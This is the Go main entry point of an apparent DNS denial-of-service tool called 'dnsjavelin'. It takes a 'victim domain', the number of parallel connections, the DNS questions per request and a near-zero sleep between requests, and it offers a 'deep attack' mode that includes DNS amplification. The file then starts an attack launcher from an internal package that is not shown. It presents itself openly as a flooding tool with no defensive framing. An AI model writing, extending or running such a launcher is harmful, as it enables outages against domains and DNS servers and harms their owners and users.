package main

import (
	"flag"
	"log"
	"runtime"
	"time"

	"github.com/sheophe/dnsjavelin/internal"
)

func main() {
	settings := internal.Settings{
		VictimDomain: flag.String("d", "", "victim domain name"),
		NRoutines:    flag.Int("c", 2*runtime.NumCPU(), "number of parallel connections"),
		NQuestions:   flag.Int("n", 16, "number of DNS qeustion in one request"),
		SleepTime:    flag.Duration("s", time.Millisecond, "sleep between requests"),
		Deep:         flag.Bool("deep", false, "deep attack, includes DNS amplification"),
	}
	flag.Parse()
	if len(*settings.VictimDomain) == 0 {
		log.Fatalf("victim domain must be specified")
	}
	launcher := internal.NewLauncher(&settings)
	launcher.Initialize()
	launcher.Start()
	launcher.AwaitShutdown()
	launcher.Stop()
}
